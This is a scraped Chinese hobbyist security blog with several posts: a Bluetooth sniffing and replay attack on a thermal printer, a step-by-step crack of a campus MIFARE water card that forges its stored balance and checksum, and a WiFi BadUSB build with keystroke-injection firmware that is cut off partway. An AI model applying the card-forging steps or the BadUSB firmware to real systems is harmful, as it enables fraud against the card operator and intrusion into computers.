<p> <img src="C:\Users\skywa\AppData\Roaming\Typora\typora-user-images\1543335819698.png" alt=""></p>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-11-28/1566315.jpg" alt=""></p>
<p>还有这个联系。</p>
<p>6.至此可以先构建23300这个金额以及校验位了</p>
<p>23300十六进制之后 =  5b 04 </p>
<p>再5b xor 04 =  5f</p>
<p>先构建如下</p>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-11-28/42871262.jpg" alt=""></p>
<p>现在还不能百分百确定x这里该补什么</p>
<p>再经过第二个异或算法：这个xf xor 04 = 5b</p>
<p>所以反算xf = 5b xor 04</p>
<p><img src="http://pico0ziv8.bkt.clouddn.com/18-11-28/96278271.jpg" alt=""></p>
<p>确定x就是5。</p>
<p>然后补上即可</p>
<h2 id="3-but这两个地方我还是不会，我菜死了。。。。。"><a href="#3-but这两个地方我还是不会，我菜死了。。。。。" class="headerlink" title="3. but这两个地方我还是不会，我菜死了。。。。。"></a>3. but这两个地方我还是不会，我菜死了。。。。。</h2><p><img src="http://pico0ziv8.bkt.clouddn.com/18-11-28/40677886.jpg" alt=""></p>
<p>所以还是没有flag难受啊！！！！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2018/11/11/SYC第三次面试报告/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/11/SYC第三次面试报告/" itemprop="url">SYC第三次面试报告</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-11T16:51:06+08:00">
                2018-11-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="0x01-基础简介"><a href="#0x01-基础简介" class="headerlink" title="0x01.基础简介"></a>0x01.基础简介</h1><h2 id="1-实验设备："><a href="#1-实验设备：" class="headerlink" title="1.实验设备："></a>1.实验设备：</h2><p>kali，安卓手机，咕咕机(GT1), 蓝牙适配器（没有就用电脑自带的hci0）</p>
<h2 id="2-剧情介绍"><a href="#2-剧情介绍" class="headerlink" title="2.剧情介绍"></a>2.剧情介绍</h2><p>在蓝牙开发中，尤其是咕咕机GT1这种只有蓝牙的型号（咕咕机有些机器可以连接wifi），基本上都是手机App与设备间的通信。手机向设备发送数据，然后等待设备的响应。但当数据发出去的时候，却不能确保设备能否准确的响应。设备属于硬件端，一般不受软件端开发人员控制，除非能和硬件端开发人员一起联调，否则很难调试。但在部分Android手机为开发人员提供了保存蓝牙日志的选项，即可保存手机向设备发送的数据和设备响应的数据。 这个log记录了host与controller通信的全部内容，列出了蓝牙协议栈的各个层的消息通信图谱。注意，由于这个log是协议栈自己生成的，它只列出了协议栈发出去的和接收到的消息，若是由于其它原因，例如UART 驱动丢包等导致的问题，则需要使用其它的log工具来寻找原因（例如uart sniffer）。 不再详述snoop log文件本身的格式。知道了这些格式，其实我们可以用wireshark和fte的capture file viewer都可以用来查看btsnoop log。 在此我把两个都给安装了，感觉wireshark鲨鱼鳍更好用一些。。。。。</p>
<p><strong>3.</strong> 首先打开wireshark是一脸蒙蔽的，首先去百度一下关于蓝牙各种协议方面的东西，大概知道每个类型的包都代表啥意思。</p>
<p>１.Hci主机控制器接口，蓝牙协议栈的重要部分，HCI Packet 在 Host 和 Control 之间进行传输，通常有三种类型 Command，Event，Data (ACL 和 SCO/eSCO)。其中 Data 是双向的, Command 只能从 Host 发往 Control, Event 始终是 Control 发向 Host 的。在本文中这点只需要了解即可。</p>
<p>２．GAP—通用访问配置文件(GernericAccess Profile) ,它的作用是发现新的BLE设备.简单一句话，你的新蓝牙设备应该被其它的设备或应用发现，这样才可以连接它。这一部分的工作主要就是由GAP完成。</p>
<ol start="3">
<li><p>ATT – 属性协议（AttributeProtocol）,总而言之，如果我们想连接web 服务器，我们必须使用HTTP协议，HTTP连接了浏览器和服务器。可以类比，应用和蓝牙智能灯泡的连接就是ATT协议控制。</p>
</li>
<li><p>GATT -通用属性配置文件(GenericAttribute Profile)。类比，我们使用浏览器与服务器交互，因此，浏览器负责交换整个数据。GATT也扮演了同样的角色。它负责在智能蓝牙灯泡和移动应用之间交换和展示整个信息。GATT只会在两个设备连接之后才会起作用。</p>
</li>
</ol>
<p>​                                                  </p>
<p><strong>4.</strong>指定方案</p>
<p>1.手机app与机器互联，在app中操做各种功能，并开启蓝牙hci调试日志进行抓包。</p>
<p>2.用wireshark分析流量</p>
<p>3使用kali工具重放包定位到数据位置</p>
<p>4.读取数据包中含义</p>
<p>5.读懂校验码，打印自己的数据</p>
<p><strong>5.实际操作</strong></p>
<p>先进行抓包工作，上来就遇到一个坑，本来用的是一款nexus7平板，开启蓝牙，然后抓包</p>
<p>，但是打开之后，发现连个ball都没有。。。</p>
<p>在这里先排雷，有些设备是抓不到的东西的，如何辨别就是打开日志文件之后查看该文件，附近除了btsnoop_hci.log之外啥都没有的话，那么肯定就是没有抓到东西了。。。。</p>
<p>后来换回主力机进行抓包，MIUI系统有个比较方便的方法，先在拨号盘界面输入<em>#</em>#5959#<em>#</em>开始抓包，然后开始在咕咕机app进行操作，然后再输入<em>#</em>#5959#<em>#</em>结束抓包。这种方法抓到的包比较及时，东西比较干净，我也是踩了很多雷之后发现的。</p>
<p>2.导入到wireshar进行数据分析。</p>
<p>上文已经说过了，里面充斥的hci包就不用看了</p>
<p>之前为了熟悉整个流程，就先参考网上的文章，先实验了一下比较简单的小米手环1.(<a href="https://mp.weixin.qq.com/s/2-g0eFGi0G544URtEvYVtw?client=tim&amp;ADUIN=1442661932&amp;ADSESSION=1542277639&amp;ADTAG=CLIENT.QQ.5591_.0&amp;ADPUBNO=26867" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/2-g0eFGi0G544URtEvYVtw?client=tim&amp;ADUIN=1442661932&amp;ADSESSION=1542277639&amp;ADTAG=CLIENT.QQ.5591_.0&amp;ADPUBNO=26867</a>)</p>
<p>熟悉了一下hcitool和gatttool两个工具。</p>
<p>依照该文章教程，成功复现之后开始查看这台咕咕机GT1.一开局就陷入找att数据包的误区，还说由于基本协议没看清。因为咕咕机是传统蓝牙4.0而手环是蓝牙4.0 ble。</p>
<p>知道看到这个</p>
<p>不应该死盯着btatt不放的。</p>
<p>于是在wireshark筛选spp数据包</p>
<p>果然瞬间清晰了很多</p>
<p>然后挨个看每个包中的内容，慢慢的发现了一些规律</p>
<p>根据操作小米手环的经验，多进行几次重复操作，容易看出一些明显的变化规律。Such as这个咕咕机有一个指示灯，可以在app里控制开关，多进行几下操作。在录制的log文件中查看，会总有那么几个数据反复出现，，，，，基本可以认为这个maybe就是你发送的命令</p>
<p>然后查找一下这段数据的写入handle，然后就可以进行重放攻击了</p>
<p>所以就往0x0003写入该数据就应该可以实现了。</p>
<p>打开kali进行操作一下。</p>
<p>1）先查询自己电脑加载的蓝牙设备</p>
<p>可以看到自带的蓝牙设备，现在是down关闭状态。</p>
<p>输入hciconfig hci0 up开启设备</p>
<p>然后成功运行，就ojbk了</p>
<p>2.开启蓝牙扫描设备</p>
<p>键入hcitool lescan（用来扫描BLE设备，BT设备也适用），也可以用hcitool scan只能扫描BT设备</p>
<p>3．搜索到目标机器直接用gatttool连接即可</p>
<p>现在我们可以使用 sudo gatttool -I -b device_mac_address 这个命令来连接机器了。</p>
<p>解释下这个命令:</p>
<p>-I          连接接口</p>
<p>-b         识别具体的mac地址</p>
<p>直接输入gatttool -I -b 00:15:83:C3:5E:51，在输入connect连接之</p>
<p>连接成功就变成蓝色</p>
<p>4.输入primary查看咕咕机提供的服务</p>
<p>输入characteristics查询设备特征</p>
<p>句柄 每一个服务和特征都有一个独一无二的部分叫做句柄。句柄是确认一个服务或特征的基本标识。因此，每个服务与特征都必须使用句柄。同时，如果我们想改变任何一个特征的值，我们必须首先确定它的句柄。</p>
<p>5.先进行重放攻击</p>
<p>开灯</p>
<p>关灯</p>
<p>成功找到数据包。重放攻击成功施行</p>
<p>\6. 证明可以成功实施之后，然后查看其他数据包</p>
<p>数据长度为102的spp数据包都是时间以及一个横线</p>
<p>可以发现时间的规律</p>
<p>在查看多个相同数据可以看出一下变化</p>
<p>可知前半部为时间码，为啥为校验码</p>
<p>直接修改时间无法打印，研究一下校验码规律</p>
<p>经过几次计算校验码的规律，直接看出规律。</p>
<p>最简单的加减差值为一定值，年月时分秒每一位变化变化前后加减之后为定值。</p>
<p>根据另一组数据解出该定值位283</p>
<p>公式为：校验位=283-年-月-日-时-分-秒-毫</p>
<p>验算一下</p>
<p>结果是对的，导入机器可以成功写入数据，</p>
<p>。</p>
<p>再看传输部分的地方</p>
<p>经过反复重放</p>
<p>确定一下数据包位置</p>
<p>经过验证这些</p>
<p>可以使用</p>
<p>然后就是以下结果</p>
<p>东西都可以打印，除了数据包部分。。。。。</p>
<p>感觉这一切都无用功了。</p>
<p>根据原理应该是把要打印图像，每层次切片</p>
<p>一层一层的打印</p>
<p>尽力而为，现在只能到这部分了。。。。。。</p>
<p>有时间把数据包可以搞清楚</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2018/11/09/SYC第二次面试报告/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="devil0x">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="devil0x菜鸟">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/09/SYC第二次面试报告/" itemprop="url">SYC第二次面试报告</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-09T02:02:33+08:00">
                2018-11-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​                                          </p>
<p>此次第二次面试研究的课题是关于水卡数据的破解以及badusb的wifi版的制作。</p>
<h1 id="1-初学RFID-三中心-13-14-15-16-17栋-水卡的破解研究"><a href="#1-初学RFID-三中心-13-14-15-16-17栋-水卡的破解研究" class="headerlink" title="1. 初学RFID-三中心(13.14.15.16.17栋)水卡的破解研究"></a>1. 初学RFID-三中心(13.14.15.16.17栋)水卡的破解研究</h1><h4 id="1-基本知识："><a href="#1-基本知识：" class="headerlink" title="1.基本知识："></a>1.基本知识：</h4><p>Mifare Classic card提供1k-4k的容量，我们经常见到的是Mifare Classic 1k(S50)，也就是所谓的M1卡。M1卡有从0到15共16个扇区，每个扇区配备了从0到3共块个段，每个段分为b0到b15共16个区块，并且可以保存16字节的内容。 </p>
<p>每个扇区的第4段呢是用来保存KeyA，KeyB和控制位的，每张卡的0扇区还有一个唯一标识的UID号。</p>
<p><strong>破解原理</strong></p>
<p>这种卡类的攻击方式大概分为这么几种：</p>
<p><strong>1</strong>）暴力破解</p>
<p>爆破对于M1卡的破解来说比较有效，因为M1卡是被动卡，需要读卡器来供能，切断供能后卡的临时数据就丢失了，也就是说不会存在输入过多错误密码后造成的锁死之类的情况</p>
<p>FFFFFFFFFFFF、A0B0C0D0E0F0等等都是M1白卡的默认密码，所以当我们使用acr122u的配套软件M1卡服务程序这样的工具来爆破的时候基本上都是用这些默认密码来填充剩余扇区的密码。</p>
<p><strong>2</strong>）克隆卡片（卡复制）</p>
<p>M1卡的扇区可以保存数据，所以大部分的卡片会选择加密扇区后保存数据，我们可以用 uid卡来进行复制，每张M1卡在0扇区第1段都有一个唯一标识，而且是保护无法修改的，uid 卡就是没有设定0扇区保护的卡，所以你可以随意的修改你想要的uid，这样我们就可以克隆出一张连uid都相同的卡片了。</p>
<p><strong>3</strong>）嗅探攻击</p>
<p>在卡和机器数据交换的时候嗅探数据，进行攻击，利用XOR算key工具就可以把扇区的密钥计算出来。（后期可在安卓端用app：M Tools进行数据的嗅探） </p>
<h4 id="2-所需工具"><a href="#2-所需工具" class="headerlink" title="2. 所需工具:"></a>2. 所需工具:</h4><p>硬件： ACR122u</p>
<p>软件：m1卡程序，fixdump，sublime Text3，UID写卡程序</p>
<p>以及安卓端：mifare classical tools, M Tools(神器)</p>
<h4 id="4-实际操作："><a href="#4-实际操作：" class="headerlink" title="4 . 实际操作："></a>4 . 实际操作：</h4><p><strong>1.</strong> <strong>首先把acr122u的驱动叽里呱啦的安装好。</strong></p>
<p><strong>2.</strong> <strong>把水卡放置道读卡上，正确识别之后灯会变为黄色。</strong></p>
<p>​           <img src="https://github.com/devil0x/picture/raw/master/11.09/1.png" alt="">                                    </p>
<p>3.打开m1服务软件，正确识别机器之后，点击开始破解。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/2.png" alt="1541320664628"></p>
<ol start="4">
<li>破解完成当即获得一个1kb dump文件，现在可以直接拖进sublime text3。但是因为是linux移植软件，所以直接打开会看到很多扇区是缺东西的，win下操作的时候需要用到一个fixdump的工具来填充剩余部分。</li>
</ol>
<p>5.先把得到的文件，重新命名为一个简单名称（dumpfile1.dump），然后进行修复dump文件。把dumpfile1.dump拖到fixdump所在文件夹，在空白处按住shift，在右击鼠标，点击在此处打开powershell，然后输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fixdump dumpfile1.dump</span><br></pre></td></tr></table></figure>
<p>6.获得4kb的dump文件。<img src="https://github.com/devil0x/picture/raw/master/11.09/3.png" alt="1541320780834"></p>
<p>   6.为了容易看出金额差别，用手机端app：mifare打开m1卡，</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/4.png" alt="1541321412959"></p>
<p>会发现没有3号4号扇区的key，</p>
<p>用sublime打开dumpfile1.dump</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/5.png" alt="1541321526563"></p>
<p>每个扇区的第4块区域，前半部为keyA 后半为keyB</p>
<p>直接导入mifare 工具，手机端图形界面好观察一些。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/6.png" alt="1541321645940"></p>
<p>直接可以看到改扇区的信息了，然后在读卡器记下现在的金额，并命名一下啊，再去刷卡处，打开机器，然后金额开始变化，再记录下金额，用dump对比工具对比。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/7.png" alt="1541322018408"></p>
<p>随即就发现了一些端倪。这几个数值出现了变化，</p>
<p><strong>E4 12</strong>     <strong>DC 90</strong></p>
<p><strong>E8 12</strong>     <strong>DB 93</strong></p>
<p>把前两部分导进进制转换器</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/8.png" alt="1541322421194"></p>
<p>刚好是金额位，那么剩下的就是。。。。校验位。</p>
<p>这都8102年了，之前经常逛酷安，知道一款神器，M Tools</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/9.png" alt="1541323524737"></p>
<p>这是一款酷安基佬开发的app，最神奇的是作者录制了视频教程，但是地址确是在油管，并附有中式英语进行讲解。现在还有一款app是M Keys也是该作者的作品，这两款app现在也都支持外置ACR122U了，so没有nfc的手机也可以外置进行操作。</p>
<p>这个app也需要提前把密钥导进去，然后就可以对扇区数据进行操作</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/10.png" alt="1541323809934"></p>
<p>这货可以预置常用的算法，什么十六进制倒序，倍数转换啊，直接一点即可。</p>
<p>然后就找到之前发现的金额位数据，直接就可以转换成47.40，然后下一不是选择校验位的算法，but真的看不出有何端倪，直接先跳过了。。。。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/10.png" alt="1541324006788"></p>
<p>然后来到这个app的核心功能地方，嗅探校验位算法。于是，在刷卡机器旁边，冲冲放放这样来了十几个来回，嗅探到了一下数据。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/11.png" alt="1541324174499"></p>
<p>目前已知的校验位计算方法有这么几种：</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/12.png" alt="1541324519138"></p>
<p>这里提供一个异或算法工具：在线BCC校验工具（<a href="http://www.ip33.com/bcc.html）" target="_blank" rel="noopener">http://www.ip33.com/bcc.html）</a></p>
<p>反正就是加减乘除，异或取反，各种操作挨个试，</p>
<p>虽说如此，还是看不出来</p>
<p>but 看了好久没看出来，就去翻着去看了几篇教程，发现了一些端倪。</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/13.png" alt="1541326346471"></p>
<p>但就是这个b12部分一直啥都看不出来，真的是毫无规律可循。但其他部分应该还是很好知道规律的</p>
<p>such as：第2块与第1块做对比，金额位b0差-4，b1没有差别，b12差+1, b15差-3，刚好钱差0.04</p>
<p>​          同理第3与第4块的做对比，金额位b0差-8，b1没有差别，b12差+1, b15差-7，刚好钱差0.08</p>
<p>那么可知，凑一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> b0 + b1 + b12-b15 = 某定值</span><br><span class="line">(-4)+(0) +(+1)-(-3)</span><br></pre></td></tr></table></figure>
<p>的话总值是没有变化的没有变化。</p>
<p>把这些数换到10进制计算出这个某定值为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">88(hex)+12(hex)+8(hex)-60(hex) = 66(十进制)</span><br></pre></td></tr></table></figure>
<p>所以b15的公式就是：b15=b0+b1+b12-66</p>
<p>把公式填进M Tools，直接成功完成验证：<img src="https://github.com/devil0x/picture/raw/master/11.09/14.png" alt="1541327523694"></p>
<p>但是这个b12什么鬼，什么规律都没有。。。。。。。。</p>
<p>但后来经过自己观察，这个可能是随机的，从图上可知每刷一次都递增一下，从00开始，such as：08.09.0A。。。。。。</p>
<p>跳过此步骤，自己开始修改数据，比如39.42，先x100，再用16进制表示3942，再倒置一下：</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/15.png" alt="1541327857383"></p>
<p>只有3个数字，空余位用0替补，验证一下<img src="https://github.com/devil0x/picture/raw/master/11.09/16.png" alt="1541327929322"></p>
<p>欧克了，那就是金额位就是66 0f，b12既然是随机的就不用管了随便填00都可以，公式再通过算出b15等于15，填上去，再用读卡器acr122u写入到一张空白的uid卡里边，完毕了。</p>
<p>这都8102年了，提供一个更快的思路，直接用M Tools</p>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/17.png" alt="1541328695589"></p>
<p>直接交给手机来吧，都不用写个c来计算了。直接充值了</p>
<p>上图<img src="https://github.com/devil0x/picture/raw/master/11.09/18.png" alt="1541328814663"></p>
<h1 id="2-wifi版badusb"><a href="#2-wifi版badusb" class="headerlink" title="2 . wifi版badusb"></a>2 . wifi版badusb</h1><p>BadUSB是今年计算机安全领域的热门话题之一，该漏洞由Karsten Nohl和Jakob Lell共同发现，并在今年的BlackHat安全大会上公布。BadUSB号称是世界上最邪恶的USB外设。</p>
<p>笔者使用他们的代码做了个类似的U盘，用户插入U盘，就会自动执行预置在固件中的恶意代码，下载服务器上恶意文件，执行恶意操作。</p>
<p>但是今天制作的东西是wifi版的badusb。可以wifi上传脚本，执行脚本，在线编辑脚本的bad USB。对了，那个九块钱的Digispark能做到这一切，不可能的，毕竟那货都不能免驱动，那还玩个ball啊……</p>
<h3 id="所需材料："><a href="#所需材料：" class="headerlink" title="所需材料："></a>所需材料：</h3><p>四根线</p>
<p>一块esp8266</p>
<p>一块CJMCU（atnniy85 芯片就行）</p>
<p>esp8266固件（<a href="https://github.com/spacehuhn/wifi_ducky/releases）" target="_blank" rel="noopener">https://github.com/spacehuhn/wifi_ducky/releases）</a></p>
<p>mjmcu 固件（<a href="https://github.com/spacehuhn/wifi_ducky/blob/master/arduino_wifi_duck/arduino_wifi_duck.ino）" target="_blank" rel="noopener">https://github.com/spacehuhn/wifi_ducky/blob/master/arduino_wifi_duck/arduino_wifi_duck.ino）</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;</span><br><span class="line">#define BAUD_RATE 57200</span><br><span class="line"></span><br><span class="line">#define ExternSerial Serial1</span><br><span class="line"></span><br><span class="line">String bufferStr = &quot;&quot;;</span><br><span class="line">String last = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">int defaultDelay = 0;</span><br><span class="line"></span><br><span class="line">void Line(String _line)</span><br><span class="line">&#123;</span><br><span class="line">  int firstSpace = _line.indexOf(&quot; &quot;);</span><br><span class="line">  if(firstSpace == -1) Press(_line);</span><br><span class="line">  else if(_line.substring(0,firstSpace) == &quot;STRING&quot;)&#123;</span><br><span class="line">    for(int i=firstSpace+1;i&lt;_line.length();i++) Keyboard.write(_line[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  else if(_line.substring(0,firstSpace) == &quot;DELAY&quot;)&#123;</span><br><span class="line">    int delaytime = _line.substring(firstSpace + 1).toInt();</span><br><span class="line">    delay(delaytime);</span><br><span class="line">  &#125;</span><br><span class="line">  else if(_line.substring(0,firstSpace) == &quot;DEFAULTDELAY&quot;) defaultDelay = _line.substring(firstSpace + 1).toInt();</span><br><span class="line">  else if(_line.substring(0,firstSpace) == &quot;REM&quot;)&#123;&#125; //nothing :/</span><br><span class="line">  else if(_line.substring(0,firstSpace) == &quot;REPLAY&quot;) &#123;</span><br><span class="line">    int replaynum = _line.substring(firstSpace + 1).toInt();</span><br><span class="line">    while(replaynum)</span><br><span class="line">    &#123;</span><br><span class="line">      Line(last);</span><br><span class="line">      --replaynum;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else&#123;</span><br><span class="line">      String remain = _line;</span><br><span class="line"></span><br><span class="line">      while(remain.length() &gt; 0)&#123;</span><br><span class="line">        int latest_space = remain.indexOf(&quot; &quot;);</span><br><span class="line">        if (latest_space == -1)&#123;</span><br><span class="line">          Press(remain);</span><br><span class="line">          remain = &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">          Press(remain.substring(0, latest_space));</span><br><span class="line">          remain = remain.substring(latest_space + 1);</span><br><span class="line">        &#125;</span><br><span class="line">        delay(5);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Keyboard.releaseAll();</span><br><span class="line">  delay(defaultDelay);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void Press(String b)&#123;</span><br><span class="line">  if(b.length() == 1) Keyboard.press(char(b[0]));</span><br><span class="line">  else if (b.equals(&quot;ENTER&quot;)) Keyboard.press(KEY_RETURN);</span><br><span class="line">  else if (b.equals(&quot;CTRL&quot;)) Keyboard.press(KEY_LEFT_CTRL);</span><br><span class="line">  else if (b.equals(&quot;SHIFT&quot;)) Keyboard.press(KEY_LEFT_SHIFT);</span><br><span class="line">  else if (b.equals(&quot;ALT&quot;)) Keyboard.press(KEY_LEFT_ALT);</span><br><span class="line">  else if (b.equals(&quot;GUI&quot;)) Keyboard.press(KEY_LEFT_GUI);</span><br><span class="line">  else if (b.equals(&quot;UP&quot;) || b.equals(&quot;UPARROW&quot;)) Keyboard.press(KEY_UP_ARROW);</span><br><span class="line">  else if (b.equals(&quot;DOWN&quot;) || b.equals(&quot;DOWNARROW&quot;)) Keyboard.press(KEY_DOWN_ARROW);</span><br><span class="line">  else if (b.equals(&quot;LEFT&quot;) || b.equals(&quot;LEFTARROW&quot;)) Keyboard.press(KEY_LEFT_ARROW);</span><br><span class="line">  else if (b.equals(&quot;RIGHT&quot;) || b.equals(&quot;RIGHTARROW&quot;)) Keyboard.press(KEY_RIGHT_ARROW);</span><br><span class="line">  else if (b.equals(&quot;DELETE&quot;)) Keyboard.press(KEY_DELETE);</span><br><span class="line">  else if (b.equals(&quot;PAGEUP&quot;)) Keyboard.press(KEY_PAGE_UP);</span><br><span class="line">  else if (b.equals(&quot;PAGEDOWN&quot;)) Keyboard.press(KEY_PAGE_DOWN);</span><br><span class="line">  else if (b.equals(&quot;HOME&quot;)) Keyboard.press(KEY_HOME);</span><br><span class="line">  else if (b.equals(&quot;ESC&quot;)) Keyboard.press(KEY_ESC);</span><br><span class="line">  else if (b.equals(&quot;BACKSPACE&quot;)) Keyboard.press(KEY_BACKSPACE);</span><br><span class="line">  else if (b.equals(&quot;INSERT&quot;)) Keyboard.press(KEY_INSERT);</span><br><span class="line">  else if (b.equals(&quot;TAB&quot;)) Keyboard.press(KEY_TAB);</span><br><span class="line">  else if (b.equals(&quot;END&quot;)) Keyboard.press(KEY_END);</span><br><span class="line">  else if (b.equals(&quot;CAPSLOCK&quot;)) Keyboard.press(KEY_CAPS_LOCK);</span><br><span class="line">  else if (b.equals(&quot;F1&quot;)) Keyboard.press(KEY_F1);</span><br><span class="line">  else if (b.equals(&quot;F2&quot;)) Keyboard.press(KEY_F2);</span><br><span class="line">  else if (b.equals(&quot;F3&quot;)) Keyboard.press(KEY_F3);</span><br><span class="line">  else if (b.equals(&quot;F4&quot;)) Keyboard.press(KEY_F4);</span><br><span class="line">  else if (b.equals(&quot;F5&quot;)) Keyboard.press(KEY_F5);</span><br><span class="line">  else if (b.equals(&quot;F6&quot;)) Keyboard.press(KEY_F6);</span><br><span class="line">  else if (b.equals(&quot;F7&quot;)) Keyboard.press(KEY_F7);</span><br><span class="line">  else if (b.equals(&quot;F8&quot;)) Keyboard.press(KEY_F8);</span><br><span class="line">  else if (b.equals(&quot;F9&quot;)) Keyboard.press(KEY_F9);</span><br><span class="line">  else if (b.equals(&quot;F10&quot;)) Keyboard.press(KEY_F10);</span><br><span class="line">  else if (b.equals(&quot;F11&quot;)) Keyboard.press(KEY_F11);</span><br><span 